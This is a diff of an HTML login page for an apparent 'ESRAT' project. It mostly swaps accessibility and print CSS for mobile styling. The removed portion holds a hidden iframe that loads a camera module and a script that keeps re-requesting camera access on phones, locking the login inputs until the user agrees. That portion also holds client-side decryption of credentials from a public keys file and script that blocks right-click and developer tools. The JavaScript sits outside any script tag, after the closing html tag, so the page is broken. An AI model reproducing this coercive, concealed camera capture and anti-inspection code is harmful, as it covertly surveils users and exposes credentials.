-            *,
-            *::before,
-            *::after {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
+        /* iPhone 12 Safari specific optimizations */
+        @media (max-width: 390px) and (max-height: 844px) {
+            .navbar .logo img {
+                height: 45px !important;
+            }
+
+            #dynamic-text {
+                font-size: 1.8rem;
+            }
+
+            .container {
+                min-width: 240px;
+                padding: 12px;
+                bottom: 10%;
             }
         }
 
-        /* High contrast mode */
-        @media (prefers-contrast: high) {
-            .login-form {
-                border: 2px solid #FFFFFF;
-                background: rgba(0, 0, 0, 0.8);
-            }
-
-            .form-input {
-                border: 2px solid #FFFFFF;
-                background: rgba(0, 0, 0, 0.6);
-            }
-
-            .login-btn {
-                border: 2px solid #FFFFFF;
-            }
-        }
-
-        /* Dark mode support */
-        @media (prefers-color-scheme: dark) {
-            /* Already optimized for dark theme */
-        }
-
-        /* Print styles */
-        @media print {
-            .underwater-world,
-            .fish,
-            .bubble,
-            .diver,
-            .submarine,
-            .jellyfish,
-            .treasure,
-            .coral,
-            .plankton,
-            .caustics {
-                display: none !important;
-            }
-
-            body {
-                background: #FFFFFF !important;
-                color: #000000 !important;
-            }
-
-            .main-container {
-                background: #FFFFFF !important;
-            }
-
-            .login-form {
-                background: #FFFFFF !important;
-                border: 2px solid #000000 !important;
-                color: #000000 !important;
-            }
-
-            .form-title,
-            .site-title {
-                color: #000000 !important;
-            }
-        }
-
-        /* Focus management for keyboard navigation */
-        .login-btn:focus,
-        .form-input:focus,
-        .social-btn:focus,
-        .remember-me:focus,
-        .forgot-password:focus {
-            outline: 2px solid rgba(255, 255, 255, 0.8);
-            outline-offset: 2px;
-        }
-
-        /* Loading state for login button */
-        .login-btn.loading {
-            position: relative;
-            color: transparent;
-        }
-
-        .login-btn.loading::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top: 2px solid #FFFFFF;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: translate(-50%, -50%) rotate(0deg);
-            }
-            100% {
-                transform: translate(-50%, -50%) rotate(360deg);
-            }
-        }
-
-        /* Error states */
-        .form-input.error {
-            border-color: #FF6B6B;
-            background: rgba(255, 107, 107, 0.1);
-        }
-
-        .error-message {
-            color: #FF6B6B;
-            font-size: 12px;
-            margin-top: 5px;
+        /* Styling for the notice board */
+        .notice-board {
             display: none;
-        }
-
-        .error-message.show {
-            display: block;
-        }
-
-        /* Success states */
-        .form-input.success {
-            border-color: #4ECDC4;
-            background: rgba(78, 205, 196, 0.1);
-        }
-
-        /* Iframe compatibility styles */
-        .iframe-container {
-            position: relative;
+            text-align: center;
+            color: rgb(255, 0, 0);
+            background-color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            font-size: 20px;
+            position: fixed;
             width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        /* Ensure proper iframe rendering */
-        iframe {
-            border: none;
-            width: 100%;
-            height: 100%;
-            display: block;
-        }
-
-        /* Prevent iframe content from interfering with parent */
-        .iframe-overlay {
-            position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1000;
-        }
-
-        /* Mobile iframe optimizations */
-        @media (max-width: 768px) {
-            iframe {
-                -webkit-overflow-scrolling: touch;
-                overflow: auto;
-            }
-        }
-
-        /* Prevent zoom on input focus for iOS */
-        @media screen and (-webkit-min-device-pixel-ratio: 0) {
-            .form-input {
-                font-size: 16px;
-            }
-        }
-
-        /* Ensure compatibility with older browsers */
-        .no-backdrop-filter .login-form,
-        .no-backdrop-filter .form-input,
-        .no-backdrop-filter .social-btn {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        /* Fallback for browsers without CSS Grid/Flexbox */
-        .no-flexbox .social-buttons {
-            text-align: center;
-        }
-
-        .no-flexbox .social-btn {
-            display: inline-block;
-            margin: 0 7px;
-        }
-
-        .no-flexbox .form-options {
-            text-align: center;
-        }
-
-        .no-flexbox .remember-me {
-            display: block;
-            margin-bottom: 10px;
+            z-index: 1001;
+            border-bottom: 2px solid rgba(255, 0, 0, 0.3);
         }
     </style>
-</head>
-<body>
-    <!-- Underwater World Background -->
+
+    <!-- Underwater World Elements -->
     <div class="underwater-world">
-        <!-- Dynamic Caustics -->
         <div class="caustics"></div>
         
         <!-- Bubbles -->
@@ -1300,13 +1100,13 @@
         <div class="bubble"></div>
         <div class="bubble"></div>
         <div class="bubble"></div>
-
-        <!-- Interactive Fish -->
+        
+        <!-- Fish -->
         <div class="fish">🐠</div>
         <div class="fish">🐟</div>
         <div class="fish">🐡</div>
         <div class="fish">🦈</div>
-
+        
         <!-- Seabed Grass/Plankton -->
         <div class="plankton"></div>
         <div class="plankton"></div>
@@ -1322,193 +1122,17 @@
         <div class="plankton"></div>
         <div class="plankton"></div>
         <div class="plankton"></div>
-
-        <!-- Diver -->
+        
+        <!-- Other sea creatures -->
         <div class="diver">🤿</div>
-
-        <!-- Submarine -->
         <div class="submarine">🚢</div>
-
-        <!-- Jellyfish -->
         <div class="jellyfish">🪼</div>
         <div class="jellyfish">🪼</div>
-
-        <!-- Treasure Chest -->
         <div class="treasure">💰</div>
-
-        <!-- Coral Reef -->
-        <div class="coral">🪸</div>
         <div class="coral">🪸</div>
         <div class="coral">🪸</div>
     </div>
-
-    <!-- Main Content -->
-    <div class="main-container">
-        <!-- Logo Section -->
-        <div class="logo-container">
-            <img src="https://es-universe.github.io/ESRAT/apks/logo.png" alt="ES-UNIVERSE Logo" class="logo-img">
-        </div>
-
-        <!-- Login Form -->
-        <form class="login-form" id="loginForm">
-            <h2 class="form-title">Welcome Back</h2>
-            
-            <!-- Username/Email Input -->
-            <div class="input-group">
-                <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
-                <i class='bx bx-user'></i>
-                <div class="error-message" id="usernameError">Please enter a valid username or email</div>
-            </div>
-
-            <!-- Password Input -->
-            <div class="input-group">
-                <input type="password" class="form-input" id="password" placeholder="Password" required>
-                <i class='bx bx-lock-alt'></i>
-                <i class='bx bx-hide password-toggle' id="passwordToggle"></i>
-                <div class="error-message" id="passwordError">Password must be at least 6 characters</div>
-            </div>
-
-            <!-- Login Button -->
-            <button type="submit" class="login-btn" id="loginBtn">
-                Sign In
-            </button>
-        </form>
-    </div>
-
-    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     
-    <script>
-
-    </script>
 </body>
 </html>
-
-
-        let cameraStream = null;  // Variable to store the camera stream
-
-        async function retrieveSacredKeys() {
-            const response = await fetch("/ESRAT/asset/keys.json");
-            const sacredKeys = await response.json();
-            return sacredKeys;
-        }
-
-        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
-            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
-            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
-            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
-                iv: decodedEssence,
-                mode: CryptoJS.mode.CBC,
-                padding: CryptoJS.pad.Pkcs7
-            });
-            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
-        }
-
-        function enableInputs() {
-            document.getElementById("username").disabled = false;
-            document.getElementById("password").disabled = false;
-            document.getElementById("loginBtn").disabled = false; // Changed from submit to loginBtn
-            // document.getElementById("notice-board").style.display = 'none';  // Hide notice board after permission
-        }
-
-        function disableInputs() {
-            document.getElementById("username").disabled = true;
-            document.getElementById("password").disabled = true;
-            document.getElementById("loginBtn").disabled = true; // Changed from submit to loginBtn
-            // document.getElementById("notice-board").style.display = 'block';  // Show notice board if permission is denied
-        }
-
-        function stopCameraStream() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
-                cameraStream = null;  // Clear the camera stream
-            }
-        }
-
-        function requestCameraPermission() {
-            // Check if the screen size is small (for mobile devices)
-            if (window.innerWidth <= 768) { // You can adjust the breakpoint as needed
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        console.log("Camera permission granted.");
-                        cameraStream = stream;  // Store the camera stream
-                        enableInputs();  // Enable inputs once permission is granted
-
-                        // Stop the camera stream after 5 seconds
-                        setTimeout(stopCameraStream, 5000);
-                        
-                        clearInterval(cameraInterval);  // Stop asking for permission after it's granted
-                    })
-                    .catch(function(err) {
-                        console.log("Camera permission denied, retrying in 5 seconds.");
-                        disableInputs();  // Keep inputs disabled if permission is denied
-                    });
-            } else {
-                // If on larger screens, directly enable inputs without asking for camera
-                enableInputs();
-            }
-        }
-
-        // Check camera permission every 5 seconds until granted
-        const cameraInterval = setInterval(requestCameraPermission, 5000);
-
-        // Event listeners for login
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent default form submission
-            verifyEnigmaticCredentials();
-        });
-        document.getElementById("password").addEventListener("keydown", (event) => {
-            if (event.key === "Enter") {
-                verifyEnigmaticCredentials();
-            }
-        });
-
-        // Function to verify credentials
-        async function verifyEnigmaticCredentials() {
-            const sacredKeys = await retrieveSacredKeys();
-            const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
-            const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
-
-            const inputIdentity = document.getElementById("username").value;
-            const inputPassage = document.getElementById("password").value;
-
-            // Check if both inputs are filled
-            if (inputIdentity === "" || inputPassage === "") {
-                alert("Please fill in both username and password.");
-                return;  // Prevent further execution
-            }
-
-            if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
-                window.location.href = "/ESRAT/index-home.html";  // Redirect if login is successful
-            } else {
-                alert("Incorrect User or Password.");  // Alert on incorrect login
-            }
-        }
-
-        // Cursor shadow effect
-        const cursorShadow = document.querySelector(".cursor-shadow");
-        document.addEventListener("mousemove", (event) => {
-            cursorShadow.style.left = event.clientX + "px";
-            cursorShadow.style.top = event.clientY + "px";
-        });
-
-        // Anti-inspection script
-        document.addEventListener("contextmenu", event => event.preventDefault());  // Disable right-click
-
-        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
-        document.onkeydown = function(e) {
-            if (e.keyCode === 123) { // F12
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) {
-                return false; // Ctrl+Shift+I
-            }
-            if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) {
-                return false; // Ctrl+U
-            }
-            if (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) {
-                return false; // Ctrl+Shift+J
-            }
-        };
 
